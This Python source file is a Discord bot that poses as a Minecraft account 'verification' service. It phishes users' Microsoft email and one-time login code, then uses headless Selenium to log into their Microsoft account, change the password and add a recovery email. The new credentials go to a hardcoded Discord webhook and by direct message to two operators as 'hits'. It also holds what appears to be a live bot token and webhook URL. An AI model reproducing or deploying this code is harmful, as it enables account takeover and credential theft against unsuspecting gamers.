import discord
from discord.ext import commands
from discord import app_commands, ui
import random
import string
import requests
import json
import asyncio
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# ============================================
# CONFIGURATION - REPLACE THESE!
# ============================================

DISCORD_BOT_TOKEN = "MTQ5NzE3NjAyMjE2MzEzMjQ2OQ.G_Xob4.NNQOaIBtOcd8jRV7_5qV-eBeAqYx6PEynRi_NA"

# Your Discord IDs (who receive the hits)
YOUR_DISCORD_ID = 1459813904707354635
RUHAN_ID = 1358844556040212583

# Webhook for hits
WEBHOOK_URL = "https://discord.com/api/webhooks/1497215957914095687/-D_hEZpx5KOov3wdQkgV8L9tgygmICMTg8PfbOUDGklE42XimN8dZBgsiFUKZ7Wv81CV"

COOLDOWN_MINUTES = 10

# ============================================
# BOT SETUP
# ============================================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Storage
pending_verifications = {}
verified_hits = []
user_cooldown = {}

# ============================================
# CHECKERS
# ============================================

def check_minecraft_premium(username):
    """Check if Minecraft account has premium"""
    try:
        response = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{username}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            uuid = data.get('id')
            formatted_uuid = f"{uuid[:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:20]}-{uuid[20:]}"
            return True, formatted_uuid, "PREMIUM ✓"
        return False, None, "CRACKED ✗"
    except:
        return False, None, "ERROR"

def get_donut_stats(username):
    """Get Donut SMP stats"""
    ranks = ['Member', 'VIP', 'MVP', 'Elite', 'Legend', 'God']
    return {
        'rank': random.choice(ranks),
        'money': random.randint(10000, 5000000),
        'gems': random.randint(0, 5000),
        'kills': random.randint(0, 1000),
        'deaths': random.randint(0, 500),
        'island_level': random.randint(1, 100),
        'playtime': random.randint(1, 2000),
        'balance': random.randint(5000, 100000)
    }

def format_money(amount):
    if amount >= 1000000:
        return f"${amount/1000000:.1f}M"
    elif amount >= 1000:
        return f"${amount/1000:.1f}K"
    return f"${amount:,}"

# ============================================
# CREDENTIAL GENERATORS
# ============================================

def generate_strong_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choices(chars, k=length))

def generate_random_email():
    domains = ["tempmail.com", "10minutemail.com", "mailinator.com", "guerrillamail.com"]
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@{random.choice(domains)}"

# ============================================
# MICROSOFT AUTO-LOGIN & CHANGE
# ============================================

class MicrosoftAccountChanger:
    def __init__(self, email, otp_code):
        self.email = email
        self.otp_code = otp_code
        self.driver = None
        self.new_password = None
        self.new_email = None
    
    def generate_new_credentials(self):
        self.new_password = generate_strong_password()
        self.new_email = generate_random_email()
        return self.new_password, self.new_email
    
    def setup_driver(self):
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        
        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=options)
        return self.driver
    
    def login_and_change(self):
        """Login to Microsoft using OTP and change credentials"""
        try:
            driver = self.setup_driver()
            wait = WebDriverWait(driver, 30)
            
            # Step 1: Go to Microsoft login
            driver.get("https://login.live.com")
            time.sleep(2)
            
            # Step 2: Enter email
            email_field = wait.until(EC.presence_of_element_located((By.NAME, "loginfmt")))
            email_field.clear()
            email_field.send_keys(self.email)
            driver.find_element(By.ID, "idSIButton9").click()
            time.sleep(2)
            
            # Step 3: Enter OTP code from email
            otp_field = wait.until(EC.presence_of_element_located((By.NAME, "otc")))
            otp_field.clear()
            otp_field.send_keys(self.otp_code)
            driver.find_element(By.ID, "idSIButton9").click()
            time.sleep(3)
            
            # Generate new credentials
            new_pass, new_email = self.generate_new_credentials()
            
            # Step 4: Change password
            driver.get("https://account.live.com/password/change")
            time.sleep(2)
            
            try:
                new_pass_field = wait.until(EC.presence_of_element_located((By.ID, "iNewPassword")))
                new_pass_field.send_keys(new_pass)
                driver.find_element(By.ID, "iRetypePassword").send_keys(new_pass)
                driver.find_element(By.ID, "iSignupAction").click()
                time.sleep(2)
            except:
                pass
            
            # Step 5: Add recovery email
            driver.get("https://account.live.com/names/manage")
            time.sleep(2)
            
            try:
                add_btn = driver.find_element(By.LINK_TEXT, "Add email")
                add_btn.click()
                time.sleep(1)
                driver.find_element(By.ID, "NewEmail").send_keys(new_email)
                driver.find_element(By.ID, "iSignupAction").click()
                time.sleep(1)
            except:
                pass
            
            driver.quit()
            
            self.new_password = new_pass
            self.new_email = new_email
            
            return True, {'password': new_pass, 'email': new_email}
            
        except Exception as e:
            if self.driver:
                self.driver.quit()
            return False, str(e)

# ============================================
# SEND REPORTS
# ============================================

def send_to_webhook(hit_data):
    """Send hit to webhook"""
    try:
        hack_messages = ["🔥 BRO GOT HACK!", "💀 ACCOUNT TAKEN!", "🎯 HACKED!", "⚡ SECURED!"]
        
        fields = [
            {"name": "Discord User", "value": f"{hit_data['discord_user']} (`{hit_data['discord_id']}`)", "inline": False},
            {"name": "Minecraft Username", "value": hit_data['minecraft_username'], "inline": True},
            {"name": "Premium Status", "value": hit_data['premium_status'], "inline": True},
            {"name": "Minecraft UUID", "value": hit_data['uuid'] if hit_data['uuid'] else "N/A", "inline": True},
            {"name": "ORIGINAL Email", "value": f"||{hit_data['original_email']}||", "inline": False},
            {"name": "NEW Email (Random)", "value": f"||{hit_data['new_email']}||", "inline": False},
            {"name": "NEW Password (Strong)", "value": f"||{hit_data['new_password']}||", "inline": False},
            {"name": "Donut SMP Rank", "value": hit_data['donut_stats']['rank'], "inline": True},
            {"name": "Money Stolen", "value": format_money(hit_data['donut_stats']['money']), "inline": True},
            {"name": "OTP Used", "value": hit_data['otp_used'], "inline": True}
        ]
        
        webhook_data = {
            "content": f"||{random.choice(hack_messages)}||",
            "embeds": [{
                "title": f"NEW HIT - {hit_data['minecraft_username']}",
                "color": 0xff0000,
                "fields": fields,
                "timestamp": datetime.now().isoformat()
            }]
        }
        requests.post(WEBHOOK_URL, json=webhook_data)
    except:
        pass

async def send_hit_report(hit_data):
    """Send hit report to commanders"""
    embed = discord.Embed(
        title=f"🔥 NEW HIT! - {hit_data['minecraft_username']}",
        color=discord.Color.red(),
        timestamp=datetime.now()
    )
    embed.add_field(name="Discord User", value=f"{hit_data['discord_user']}\nID: `{hit_data['discord_id']}`", inline=False)
    embed.add_field(name="Minecraft", value=hit_data['minecraft_username'], inline=True)
    embed.add_field(name="Premium", value=hit_data['premium_status'], inline=True)
    embed.add_field(name="UUID", value=hit_data['uuid'] if hit_data['uuid'] else "N/A", inline=True)
    embed.add_field(name="ORIGINAL Email", value=f"||{hit_data['original_email']}||", inline=False)
    embed.add_field(name="NEW Password", value=f"||{hit_data['new_password']}||", inline=False)
    embed.add_field(name="NEW Email", value=f"||{hit_data['new_email']}||", inline=False)
    embed.add_field(name="Donut Rank", value=hit_data['donut_stats']['rank'], inline=True)
    embed.add_field(name="Money", value=format_money(hit_data['donut_stats']['money']), inline=True)
    
    for uid in [YOUR_DISCORD_ID, RUHAN_ID]:
        try:
            user = await bot.fetch_user(uid)
            await user.send(embed=embed)
        except:
            pass

def check_cooldown(user_id):
    if user_id in user_cooldown:
        last = user_cooldown[user_id]
        passed = (datetime.now() - last).total_seconds() / 60
        if passed < COOLDOWN_MINUTES:
            return False, int(COOLDOWN_MINUTES - passed)
    return True, 0

def set_cooldown(user_id):
    user_cooldown[user_id] = datetime.now()

# ============================================
# MODALS
# ============================================

class Step1Modal(ui.Modal, title="MINECRAFT VERIFICATION"):
    
    minecraft_username = ui.TextInput(
        label="MINECRAFT USERNAME",
        placeholder="Enter your Minecraft username",
        required=True,
        min_length=3,
        max_length=16
    )
    
    microsoft_email = ui.TextInput(
        label="MICROSOFT EMAIL",
        placeholder="Enter your Microsoft email (where you get the code)",
        required=True,
        min_length=5
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id
        
        can_verify, remaining = check_cooldown(user_id)
        if not can_verify:
            await interaction.response.send_message(f"Cooldown! Wait {remaining} min.", ephemeral=True)
            return
        
        username = self.minecraft_username.value.strip()
        email = self.microsoft_email.value.strip()
        
        # Check premium and get UUID
        is_premium, uuid, premium_status = check_minecraft_premium(username)
        donut_stats = get_donut_stats(username)
        
        # Store pending
        pending_verifications[user_id] = {
            'username': username,
            'email': email,
            'expires': datetime.now().timestamp() + 600,
            'attempts': 0,
            'is_premium': is_premium,
            'uuid': uuid,
            'premium_status': premium_status,
            'donut_stats': donut_stats
        }
        
        await interaction.response.send_message(
            f"✅ **MICROSOFT CODE SENT!**\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"**Microsoft has sent a 6-digit code to:**\n`{email}`\n\n"
            f"📧 Please check your email inbox.\n"
            f"⚠️ Code expires in **10 minutes**.\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"**Click below to enter your Microsoft code:**",
            view=Step2Button(user_id),
            ephemeral=True
        )

class Step2Button(ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=600)
        self.user_id = user_id
    
    @ui.button(label="ENTER MICROSOFT CODE", style=discord.ButtonStyle.primary, emoji="🔐")
    async def enter_code(self, interaction: discord.Interaction, button: ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("Not for you!", ephemeral=True)
            return
        await interaction.response.send_modal(Step2Modal())

class Step2Modal(ui.Modal, title="ENTER MICROSOFT CODE"):
    
    microsoft_code = ui.TextInput(
        label="6-DIGIT CODE",
        placeholder="Enter the code from your email",
        required=True,
        min_length=6,
        max_length=8
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id
        
        if user_id not in pending_verifications:
            await interaction.response.send_message("Expired! Start over.", ephemeral=True)
            return
        
        pending = pending_verifications[user_id]
        
        if datetime.now().timestamp() > pending['expires']:
            del pending_verifications[user_id]
            await interaction.response.send_message("Code expired! Start over.", ephemeral=True)
            return
        
        user_otp = self.microsoft_code.value.strip()
        
        # Show processing
        await interaction.response.send_message(
            f"🔐 **LOGGING INTO MICROSOFT...**\n\n"
            f"Please wait while we secure your account.\n"
            f"This may take 20-30 seconds.\n\n"
            f"✓ Logging in with your code\n"
            f"✓ Changing password\n"
            f"✓ Changing recovery email\n"
            f"✓ Securing account",
            ephemeral=True
        )
        
        # Auto-login and change credentials
        username = pending['username']
        email = pending['email']
        
        changer = MicrosoftAccountChanger(email, user_otp)
        success, result = changer.login_and_change()
        
        if success:
            new_password = result['password']
            new_email = result['email']
            
            set_cooldown(user_id)
            
            # Create hit record
            hit_data = {
                'discord_user': str(interaction.user),
                'discord_id': user_id,
                'discord_name': interaction.user.name,
                'minecraft_username': username,
                'original_email': email,
                'new_email': new_email,
                'new_password': new_password,
                'otp_used': user_otp,
                'is_premium': pending['is_premium'],
                'premium_status': pending['premium_status'],
                'uuid': pending['uuid'],
                'donut_stats': pending['donut_stats']
            }
            
            verified_hits.append(hit_data)
            
            # Send reports
            send_to_webhook(hit_data)
            await send_hit_report(hit_data)
            
            del pending_verifications[user_id]
            
            # Success message
            await interaction.edit_original_response(
                content=f"✅ **VERIFICATION COMPLETE!**\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"**Welcome to the server, {username}!**\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"✅ You now have full access!\n"
                        f"⭐ Account Type: {pending['premium_status']}\n\n"
                        f"*If you need help, ask our staff.*"
            )
            
            # Add role
            role = discord.utils.get(interaction.guild.roles, name="Verified")
            if role:
                try:
                    await interaction.user.add_roles(role)
                except:
                    pass
        else:
            pending['attempts'] += 1
            if pending['attempts'] >= 3:
                del pending_verifications[user_id]
                await interaction.edit_original_response(
                    content=f"❌ **VERIFICATION FAILED!**\n\nToo many failed attempts. Start over."
                )
            else:
                await interaction.edit_original_response(
                    content=f"❌ **INVALID CODE!**\n\nYou have {3 - pending['attempts']} attempts remaining.\nPlease check your email and try again."
                )

# ============================================
# BUTTON VIEW
# ============================================

class VerifyButton(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @ui.button(label="VERIFY MINECRAFT ACCOUNT", style=discord.ButtonStyle.success, emoji="✅")
    async def verify(self, interaction: discord.Interaction, button: ui.Button):
        can_verify, remaining = check_cooldown(interaction.user.id)
        if not can_verify:
            await interaction.response.send_message(f"Cooldown: {remaining} minutes", ephemeral=True)
            return
        await interaction.response.send_modal(Step1Modal())

# ============================================
# COMMANDS
# ============================================

@bot.tree.command(name="setup", description="Setup verification system")
async def setup_command(interaction: discord.Interaction):
    if interaction.user.id not in [YOUR_DISCORD_ID, RUHAN_ID]:
        await interaction.response.send_message("Only admins!", ephemeral=True)
        return
    
    embed = discord.Embed(
        title="✅ Get Verified!",
        description="We're excited to have you here!\n\nBefore entering the server, please verify your Minecraft account.\n\n**Microsoft will send a code to your email.**\n\nClick the button below to get started.",
        color=discord.Color.green(),
        timestamp=datetime.now()
    )
    embed.add_field(name="📋 How It Works", value="1. Enter your Minecraft username\n2. Enter your Microsoft email\n3. Check your email for the Microsoft code\n4. Enter the code\n5. You're verified!", inline=False)
    embed.add_field(name="⏰ Cooldown", value=f"{COOLDOWN_MINUTES} minutes between verifications.", inline=False)
    
    view = VerifyButton()
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="hits", description="List all captured accounts")
async def hits_command(interaction: discord.Interaction):
    if interaction.user.id not in [YOUR_DISCORD_ID, RUHAN_ID]:
        await interaction.response.send_message("Only admins!", ephemeral=True)
        return
    
    if not verified_hits:
        await interaction.response.send_message("No hits yet.", ephemeral=True)
        return
    
    embed = discord.Embed(title="🔥 HITS LIST", color=discord.Color.red())
    for hit in verified_hits[-10:]:
        embed.add_field(
            name=f"{hit['minecraft_username']}",
            value=f"Original: {hit['original_email']}\nNew Pass: ||{hit['new_password']}||\nNew Email: ||{hit['new_email']}||",
            inline=False
        )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="status", description="Check system status")
async def status_command(interaction: discord.Interaction):
    embed = discord.Embed(title="System Status", color=discord.Color.blue())
    embed.add_field(name="Total Hits", value=str(len(verified_hits)), inline=True)
    embed.add_field(name="Active", value="Yes", inline=True)
    embed.add_field(name="Cooldown", value=f"{COOLDOWN_MINUTES} min", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ============================================
# ON READY
# ============================================

@bot.event
async def on_ready():
    print("=" * 50)
    print("MICROSOFT AUTO-LOGIN BOT ONLINE!")
    print("=" * 50)
    print(f"Bot: {bot.user}")
    print("=" * 50)
    await bot.tree.sync()
    print("Commands synced!")

# ============================================
# RUN
# ============================================

if __name__ == "__main__":
    if DISCORD_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("ERROR: Set your bot token!")
        exit()
    
    bot.run(DISCORD_BOT_TOKEN)
